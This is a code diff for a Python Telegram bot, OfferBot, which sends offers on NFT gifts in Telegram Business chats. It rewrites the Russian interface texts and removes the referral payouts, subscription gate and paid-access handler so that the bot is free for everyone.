@@ -36,15 +36,18 @@ def display_name(user) -> str:
 
 
 def instruction(locale="ru"):
-    return ("<b>📘 Как пользоваться OfferBot</b>\\n\\n"
-            "1. Откройте <b>Настройки → Telegram для бизнеса → Чат-боты</b> и подключите этого бота.\\n"
-            "2. Разрешите боту доступ к сообщениям.\\n"
-            "3. В Business-чате отправьте команду с NFT и ценой:\\n"
-            "<code>офер https://t.me/nft/PartySparkler-140864 150 stars</code>\\n\\n"
-            "<b>Валюта:</b> stars, gram или рубли (₽).\\n"
-            "<b>Язык:</b> en, cn или ar в конце команды. По умолчанию — русский.\\n"
-            "Получателя подарка можно сохранить: <code>/transfer @username</code>.\\n\\n"
-            "🆓 Доступ бесплатный для всех.")
+    return (
+        "<b>📘 КАК ПОЛЬЗОВАТЬСЯ OFFERBOT</b>\n"
+        "<blockquote>Бесплатный бот для отправки оферов на подарки.</blockquote>\n"
+        "<b>1.</b> Откройте <b>Настройки → Telegram для бизнеса → Чат-боты</b>.\n"
+        "<b>2.</b> Подключите OfferBot и разрешите доступ к сообщениям.\n"
+        "<b>3.</b> В Business-чате отправьте офер в формате:\n"
+        "<blockquote><code>офер https://t.me/nft/PartySparkler-140864 150 stars</code></blockquote>\n"
+        "<b>Валюта:</b> <code>stars</code>, <code>gram</code> или <code>₽</code>.\n"
+        "<b>Язык:</b> в конце добавьте <code>en</code>, <code>cn</code> или <code>ar</code>.\n"
+        "<b>Получатель подарка:</b> <code>/transfer @username</code>.\n\n"
+        "🆓 <b>Все функции бесплатны.</b>"
+    )
 
 
 def error_text(kind):
@@ -91,28 +94,6 @@ def main_menu_keyboard(user_id: int | None = None):
         [InlineKeyboardButton(text="🛟 Техподдержка", callback_data="support_start")]
     ]
     return InlineKeyboardMarkup(inline_keyboard=rows)
-
-
-def referral_keyboard():
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="« В главное меню", callback_data="back_to_start")]
-    ])
-
-
-async def referral_text(user_id: int) -> str:
-    db.register_referral(user_id, None)
-    info = db.referral_info(user_id)
-    me = await bot.get_me()
-    link = f"https://t.me/{me.username}?start=ref_{user_id}"
-    return (
-        "<b>🎁 Реферальная программа</b>\n"
-        "Приглашайте друзей по своей ссылке. Когда друг впервые оплатит доступ, "
-        "вы получите <b>3 TON</b>.\n\n"
-        f"Ваша ссылка: {link}\n"
-        f"Успешных приглашений: {info['count']}\n"
-        f"Баланс наград: <b>{info['balance']:g} TON</b>\n\n"
-        "Для вывода напишите в техподдержку."
-    )
 
 
 def purchase_success_keyboard():
@@ -296,8 +277,7 @@ async def on_start(message: Message):
     if not message.from_user:
         return
     user = message.from_user
-    is_new_user = db.find_user_by_username(user.username) is None if user.username else True
-    # New-user notification is deduplicated below using the ID presence check.
+    # Determine whether this exact Telegram account is new (one indexed lookup).
     try:
         with db.connect() as con, con.cursor() as cur:
             cur.execute("SELECT 1 FROM bot_users WHERE user_id=%s", (user.id,))
@@ -310,28 +290,13 @@ async def on_start(message: Message):
             await bot.send_message(cfg.owner_id, f"👤 <b>Новый пользователь</b>\n{display_name(user)} · @{user.username or 'без username'}\nID: <code>{user.id}</code>")
         except Exception:
             log.exception("Could not notify owner about new user")
-    referrer_id = None
-    parts = (message.text or "").split(maxsplit=1)
-    if len(parts) > 1 and parts[1].startswith("ref_") and parts[1][4:].isdigit():
-        referrer_id = int(parts[1][4:])
-    db.register_referral(user.id, referrer_id)
-
-    # Проверяем актуальную подписку при каждом /start: подписанным сразу показываем меню,
-    # отписавшимся снова предлагаем подписаться.
-    if await is_channel_subscriber(user.id):
-        await message.answer(
-            "<b>Привет, друг! Ты попал в рай профитов.</b>\n\nВыбери, что тебе нужно:",
-            reply_markup=main_menu_keyboard(user.id),
-        )
-        return
-
-    try:
-        await message.answer(
-            "<b>Сначала подпишись на канал, чтобы получать информацию.</b>",
-            reply_markup=subscription_keyboard(),
-        )
-    except Exception:
-        log.exception("Failed to send subscription prompt")
+    # Бесплатный доступ без обязательной подписки: не тратим время на get_chat_member.
+    await message.answer(
+        "<b>✦ Добро пожаловать в OfferBot</b>\n\n"
+        "<blockquote>Оферы на подарки — быстро, удобно и бесплатно.</blockquote>\n"
+        "Выберите нужный раздел:",
+        reply_markup=main_menu_keyboard(user.id),
+    )
 
 
 async def is_channel_subscriber(user_id: int) -> bool:
@@ -376,7 +341,7 @@ async def my_profile_callback(call: CallbackQuery):
     u = call.from_user
     db.register_user(u.id, u.username, u.first_name, u.last_name)
     data = db.user_profile_stats(u.id)
-    profile = db.get_profile(u.id)
+    profile = data.get("profile")
     connection = db.get_connection_for_user(u.id)
     created = data["user"]["created_at"] if data.get("user") else None
     created_text = created.strftime("%d.%m.%Y") if created and hasattr(created, "strftime") else "—"
@@ -392,7 +357,7 @@ async def my_profile_callback(call: CallbackQuery):
         f"🔗 {safe_username}\\n"
         f"🆔 <code>{u.id}</code>\\n\\n"
         "<b>СТАТУС</b>\\n"
-        "🟢 Доступ: <b>бесплатный, активен</b>\\n"
+        "🆓 Доступ: <b>бесплатный</b>\\n"
         f"🔌 Telegram Business: {connection_status}\\n"
         f"🎁 Получатель подарка: <b>{safe_transfer}</b>\\n\\n"
         "<b>АКТИВНОСТЬ</b>\\n"
@@ -425,21 +390,6 @@ async def support_start_callback(call: CallbackQuery):
     awaiting_support.add(call.from_user.id)
     await call.message.answer("🛟 Напиши сообщение в поддержку одним сообщением. Мы передадим его администратору. Для отмены отправь /cancel.")
     await call.answer()
-
-@dp.callback_query(F.data == "show_referral")
-async def show_referral_callback(call: CallbackQuery):
-    if not call.from_user:
-        await call.answer("Не удалось определить пользователя", show_alert=True)
-        return
-    try:
-        text = await referral_text(call.from_user.id)
-        await call.message.edit_text(text, reply_markup=referral_keyboard(), disable_web_page_preview=True)
-    except Exception:
-        log.exception("Failed to show referral program")
-        await call.answer("Не удалось открыть реферальную программу. Попробуйте ещё раз.", show_alert=True)
-        return
-    await call.answer()
-
 
 @dp.callback_query(F.data == "show_instruction")
 async def show_instruction_callback(call: CallbackQuery):
@@ -694,10 +644,6 @@ async def handle_text(message: Message, is_business: bool):
             db.set_connection_blocked(connection["connection_id"], False)
         await reply_message(message, "✅ Бесплатный доступ активирован! Теперь можешь пользоваться OfferBot.")
         return
-    if low.startswith("/ref"):
-        if not message.from_user: return
-        await reply_message(message, await referral_text(message.from_user.id), reply_markup=referral_keyboard())
-        return
     if low.startswith("/admin") or low.startswith("/админ"):
         await admin_command(message)
         return
@@ -810,30 +756,12 @@ def admin_connections_text(offset: int = 0):
     return "\n".join(lines), len(rows) == 8
 
 
-@dp.callback_query(F.data == "buy_access")
-async def buy_access_callback(call: CallbackQuery):
-    if not call.from_user:
-        await call.answer("Ошибка", show_alert=True)
-        return
-    await call.answer("Доступ бесплатный и уже открыт для всех!", show_alert=True)
-    try:
-        await call.message.edit_text(
-            "🆓 <b>OfferBot бесплатен для всех!</b>\\n\\n"
-            "Подключите Telegram Business и пользуйтесь всеми функциями.",
-            reply_markup=main_menu_keyboard(call.from_user.id),
-        )
-    except Exception:
-        await call.message.answer(
-            "🆓 <b>Доступ бесплатный и открыт для всех.</b>",
-            reply_markup=main_menu_keyboard(call.from_user.id),
-        )
-
 @dp.callback_query(F.data == "back_to_start")
 async def back_to_start_callback(call: CallbackQuery):
     try:
-        await call.message.edit_text("<b>Привет, друг! Ты попал в рай профитов.</b>", reply_markup=main_menu_keyboard(call.from_user.id if call.from_user else None))
+        await call.message.edit_text("<b>✨ OFFERBOT</b>\\n<blockquote>Умные оферы для Telegram Business</blockquote>\\n🆓 Бесплатно для всех. Выберите действие:", reply_markup=main_menu_keyboard(call.from_user.id if call.from_user else None))
     except Exception:
-        await call.message.answer("<b>Привет, друг! Ты попал в рай профитов.</b>", reply_markup=main_menu_keyboard(call.from_user.id if call.from_user else None))
+        await call.message.answer("<b>✨ OFFERBOT</b>\\n<blockquote>Умные оферы для Telegram Business</blockquote>\\n🆓 Бесплатно для всех. Выберите действие:", reply_markup=main_menu_keyboard(call.from_user.id if call.from_user else None))
     await call.answer()
 
 
